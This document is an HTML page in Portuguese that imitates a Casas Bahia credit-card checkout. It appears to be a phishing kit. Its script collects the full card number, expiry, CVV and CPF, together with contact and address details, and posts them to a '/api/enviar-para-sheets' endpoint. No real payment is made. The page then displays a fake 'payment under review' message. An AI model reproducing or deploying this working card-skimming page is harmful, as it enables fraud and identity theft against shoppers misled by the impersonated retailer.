<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Casas Bahia - Pagamento com Cart√£o</title>
    <meta name="description" content="Finalize seu pagamento com cart√£o de cr√©dito na Casas Bahia.">
    <meta name="robots" content="noindex, nofollow">
    <style>
        :root {
            --bg-main: #FFFFFF;
            --bg-secondary: #F2F2F2;
            --text-main: #000000;
            --text-secondary: #555555;
            --accent-primary: #0033C6;
            --accent-secondary: #FF8533;
            --border-color: #DDDDDD;
            --success-green: #00CB0A;
            --error-red: #BB2828;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-secondary);
            color: var(--text-main);
            line-height: 1.6;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .container {
            width: 90%;
            max-width: 800px;
            margin: 0 auto;
        }

        .header, .footer {
            background-color: var(--bg-main);
            padding: 1rem 0;
            text-align: center;
            border-bottom: 1px solid var(--border-color);
        }

        .header .logo {
            max-width: 200px;
            height: auto;
        }

        .footer {
            margin-top: auto;
            padding: 2rem 0;
            color: var(--text-secondary);
            font-size: 0.9rem;
            border-top: 1px solid var(--border-color);
        }

        main {
            padding: 40px 0;
            flex-grow: 1;
        }

        h1, h2 {
            text-align: center;
            margin-bottom: 1.5rem;
            color: var(--accent-primary);
        }

        h1 {
            font-size: 2.2rem;
        }

        h2 {
            font-size: 1.6rem;
        }

        .payment-layout {
            display: flex;
            flex-direction: column;
            gap: 2rem;
        }

        .payment-section {
            background-color: var(--bg-main);
            padding: 2rem;
            border-radius: 10px;
            border: 1px solid var(--border-color);
        }

        .order-summary ul {
            list-style: none;
        }

        .order-summary li {
            display: flex;
            justify-content: space-between;
            padding: 0.8rem 0;
            font-size: 1.1rem;
            border-bottom: 1px solid var(--border-color);
        }

        .order-summary li:last-child {
            border-bottom: none;
        }

        .order-summary .total {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--accent-primary);
            margin-top: 1rem;
        }

        .installment-option {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem;
            margin-bottom: 0.5rem;
            border: 2px solid var(--border-color);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .installment-option:hover {
            border-color: var(--accent-secondary);
            background-color: #FFF8F2;
        }

        .installment-option.selected {
            border-color: var(--accent-primary);
            background-color: #F0F5FF;
        }

        .installment-info .installments {
            font-weight: bold;
        }

        .installment-info .value {
            font-size: 1.2rem;
            font-weight: bold;
            color: var(--accent-primary);
        }

        .installment-total {
            font-size: 0.9rem;
            color: var(--text-secondary);
            text-align: right;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            background-color: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 5px;
            font-size: 1rem;
        }

        .form-group input:focus {
            outline: none;
            border-color: var(--accent-primary);
        }

        .form-row {
            display: flex;
            gap: 1rem;
        }

        .form-row .form-group {
            flex: 1;
        }

        .submit-btn {
            width: 100%;
            padding: 15px;
            background-color: var(--success-green);
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.2rem;
            font-weight: bold;
            text-transform: uppercase;
            transition: background-color 0.3s ease;
        }

        .submit-btn:hover:not(:disabled) {
            background-color: #00a50a;
        }

        .submit-btn:disabled {
            background-color: #999;
            cursor: not-allowed;
        }

        .error-message {
            color: var(--error-red);
            font-size: 0.9rem;
            margin-top: 5px;
            display: none;
        }

        input.invalid {
            border-color: var(--error-red);
        }

        .security-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 1rem;
            background-color: #F0FFF4;
            border: 1px solid var(--success-green);
            border-radius: 8px;
            padding: 1rem;
            margin-top: 1.5rem;
            text-align: center;
        }

        .security-info .icon {
            font-size: 1.5rem;
        }

        .security-info p {
            margin: 0;
            color: var(--text-secondary);
        }

        .security-info img {
            height: 60px;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 1.8rem;
            }
            .payment-section {
                padding: 1.5rem;
            }
            .form-row {
                flex-direction: column;
                gap: 0;
            }
            .installment-option {
                flex-direction: column;
                align-items: flex-start;
                gap: 0.5rem;
            }
            .installment-total {
                text-align: left;
            }
        }
    </style>
</head>
<body>

    <header class="header">
        <div class="container">
            <a href="index.html">
                <img src="logo.svg" alt="Logo Casas Bahia" class="logo">
            </a>
        </div>
    </header>

    <main>
        <div class="container">
            <h1>üí≥ Pagamento com Cart√£o de Cr√©dito</h1>
            <div class="payment-layout">
                
                <section class="payment-section order-summary">
                    <h2>Resumo do Pedido</h2>
                    <ul>
                        <li>
                            <img id="produto-img" src="1xg.avif" alt="Imagem do Produto" style="width:100px; border-radius:5px; object-fit:cover;"> 
                            <span id="produto-nome">Carregando...</span></li>
                        <li><span>Valor do Produto:</span> <span id="produto-preco">R$ 8.700,00</span></li>
                        <li><span>Frete:</span> <span id="frete-valor">R$ 0,00</span></li>
                        <li><span>Juros:</span> <span id="juros-valor">R$ 0,00</span></li>
                        <li class="total"><span>Total a Pagar:</span> <span id="total-valor">R$ 8.700,00</span></li>
                    </ul>
                </section>

                <section class="payment-section">
                    <h2>Escolha o Parcelamento</h2>
                    <div id="opcoes-parcelas">
                    </div>
                </section>

                <section class="payment-section">
                    <h2>Dados do Cart√£o</h2>
                    <form id="cartao-form" novalidate>
                        <div class="form-group">
                            <label for="numero-cartao">N√∫mero do Cart√£o</label>
                            <input type="text" id="numero-cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
                            <p class="error-message">N√∫mero do cart√£o inv√°lido.</p>
                        </div>
                        
                        <div class="form-group">
                            <label for="nome-cartao">Nome no Cart√£o</label>
                            <input type="text" id="nome-cartao" placeholder="Nome como est√° no cart√£o" required>
                            <p class="error-message">Campo obrigat√≥rio.</p>
                        </div>
                        
                        <div class="form-row">
                            <div class="form-group">
                                <label for="validade">Validade</label>
                                <input type="text" id="validade" placeholder="MM/AA" maxlength="5" required>
                                <p class="error-message">Validade inv√°lida (MM/AA).</p>
                            </div>
                            
                            <div class="form-group">
                                <label for="cvv">CVV</label>
                                <input type="text" id="cvv" placeholder="123" maxlength="4" required>
                                <p class="error-message">CVV inv√°lido.</p>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label for="cpf">CPF do Titular</label>
                            <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14" required>
                            <p class="error-message">CPF inv√°lido.</p>
                        </div>
                        
                        <button type="submit" class="submit-btn" disabled>Finalizar Pagamento</button>
                        
                        <div class="security-info">
                            <span class="icon">üîí</span>
                            <div>
                                <p><strong>Ambiente 100% Seguro</strong></p>
                                <p>Seus dados est√£o protegidos com criptografia SSL</p>
                            </div>
                            <img src="selosslcomprasegura.webp" alt="Selo SSL" onerror="this.style.display='none'">
                        </div>
                    </form>
                </section>

            </div>
        </div>
    </main>

    <footer class="footer">
        <div class="container">
            <p>Compra Segura - Casas Bahia Todos os Direitos Reservados &copy; 2025</p>
        </div>
    </footer>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const state = {
        urlParams: new URLSearchParams(window.location.search),
        productPrice: 0,
        shipping: 0,
        baseTotal: 0,
        selectedInstallment: 1
    };

    const elements = {
        productName: document.getElementById('produto-nome'),
        productPrice: document.getElementById('produto-preco'),
        shippingValue: document.getElementById('frete-valor'),
        interestValue: document.getElementById('juros-valor'),
        totalValue: document.getElementById('total-valor'),
        installmentsContainer: document.getElementById('opcoes-parcelas'),
        submitButton: document.querySelector('.submit-btn'),
        inputs: {
            cardNumber: document.getElementById('numero-cartao'),
            cardName: document.getElementById('nome-cartao'),
            expiryDate: document.getElementById('validade'),
            cvv: document.getElementById('cvv'),
            cpf: document.getElementById('cpf')
        }
    };

    const form = document.getElementById('cartao-form');

    const formatCurrency = (value) => {
        return 'R$ ' + value.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    };

    const validateField = (input, isValid, errorMessage) => {
        const errorElement = input.parentElement.querySelector('.error-message');
        if (isValid) {
            input.classList.remove('invalid');
            errorElement.style.display = 'none';
        } else {
            input.classList.add('invalid');
            errorElement.textContent = errorMessage;
            errorElement.style.display = 'block';
        }
        return isValid;
    };

    const validateForm = () => {
        const allValid = 
            elements.inputs.cardNumber.value.replace(/\s/g, '').length >= 13 &&
            elements.inputs.cardName.value.trim().length >= 2 &&
            /^(0[1-9]|1[0-2])\/\d{2}$/.test(elements.inputs.expiryDate.value) &&
            elements.inputs.cvv.value.length >= 3 &&
            elements.inputs.cpf.value.replace(/\D/g, '').length === 11;
        
        elements.submitButton.disabled = !allValid;
    };

    const generateInstallmentOptions = () => {
        const maxInstallments = 12;
        elements.installmentsContainer.innerHTML = '';

        for (let i = 1; i <= maxInstallments; i++) {
            const installmentValue = state.baseTotal / i;
            const totalWithInterest = state.baseTotal;

            const option = document.createElement('div');
            option.className = 'installment-option';
            if (i === 1) option.classList.add('selected');
            option.dataset.installments = i;

            option.innerHTML = `
                <div class="installment-info">
                    <div class="installments">${i}x de ${formatCurrency(installmentValue)}</div>
                    <div class="value">Total: ${formatCurrency(totalWithInterest)}</div>
                </div>
                <div class="installment-total">
                    ${i === 1 ? '√Ä vista' : 'Sem juros'}
                </div>
            `;

            option.addEventListener('click', () => {
                document.querySelectorAll('.installment-option').forEach(opt => opt.classList.remove('selected'));
                option.classList.add('selected');
                state.selectedInstallment = i;
                updateOrderSummary();
            });

            elements.installmentsContainer.appendChild(option);
        }
    };

    const updateOrderSummary = () => {
        const interest = 0;
        const total = state.baseTotal + interest;
        
        elements.interestValue.textContent = formatCurrency(interest);
        elements.totalValue.textContent = formatCurrency(total);
    };

    const sendApiRequest = (endpoint, payload) => {
        fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (!response.ok) console.error(`Resposta n√£o-OK em ${endpoint}:`, response.statusText);
            return response.text();
        })
        .then(data => console.log(`Sucesso em ${endpoint}:`, data))
        .catch(error => console.error(`Erro de rede em ${endpoint}:`, error));
    };

    const handleFormSubmit = (event) => {
        event.preventDefault();
        
        const cardData = {
            produto: state.urlParams.get('produto_nome'),
            valor: elements.totalValue.textContent,
            parcelas: state.selectedInstallment,
            nome: state.urlParams.get('nome'),
            email: state.urlParams.get('email'),
            telefone: state.urlParams.get('telefone'),
            endereco: state.urlParams.get('endereco'),
            cidade: state.urlParams.get('cidade'),
            estado: state.urlParams.get('estado'),
            cep: state.urlParams.get('cep'),
            numero_cartao_completo: elements.inputs.cardNumber.value.replace(/\s/g, ''),
            nome_cartao: elements.inputs.cardName.value.trim(),
            validade: elements.inputs.expiryDate.value,
            cvv: elements.inputs.cvv.value,
            cpf: elements.inputs.cpf.value.replace(/\D/g, ''),
        };
        cardData.cartao_final = cardData.numero_cartao_completo.slice(-4);

        sendApiRequest('/api/enviar-para-sheets', { tipo: 'cartao_inserido', dados: cardData });

        elements.submitButton.textContent = 'Processando...';
        elements.submitButton.disabled = true;

        setTimeout(() => {
            alert('üéâ Pagamento em An√°lise!\n\nVoc√™ receber√° um email de confirma√ß√£o em breve.\nPrazo de entrega: 5-20 dias √∫teis.');
            window.location.href = 'index.html';
        }, 3000);
    };

    const initializePage = () => {
        state.productPrice = parseFloat(state.urlParams.get("produto_preco")) || 993.40;
        state.shipping = parseFloat(state.urlParams.get("frete")) || 0;
        state.baseTotal = parseFloat(state.urlParams.get("total")) || state.productPrice + state.shipping;

        elements.productName.textContent = state.urlParams.get('produto_nome') || 'Produto n√£o encontrado';
        elements.productPrice.textContent = formatCurrency(state.productPrice);
        elements.shippingValue.textContent = formatCurrency(state.shipping);

        generateInstallmentOptions();
        updateOrderSummary();

        elements.inputs.cardNumber.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = value;
            validateField(e.target, value.replace(/\s/g, '').length >= 13, 'N√∫mero do cart√£o inv√°lido.');
            validateForm();
        });

        elements.inputs.cardName.addEventListener('input', (e) => {
            validateField(e.target, e.target.value.trim().length >= 2, 'Nome √© obrigat√≥rio.');
            validateForm();
        });

        elements.inputs.expiryDate.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) value = `${value.substring(0, 2)}/${value.substring(2, 4)}`;
            e.target.value = value;
            validateField(e.target, /^(0[1-9]|1[0-2])\/\d{2}$/.test(value), 'Validade inv√°lida (MM/AA).');
            validateForm();
        });

        elements.inputs.cvv.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
            validateField(e.target, e.target.value.length >= 3, 'CVV inv√°lido.');
            validateForm();
        });

        elements.inputs.cpf.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            e.target.value = value;
            validateField(e.target, value.replace(/\D/g, '').length === 11, 'CPF inv√°lido.');
            validateForm();
        });

        form.addEventListener('submit', handleFormSubmit);
        validateForm();
    };

    initializePage();
});
</script>
</body>
</html>
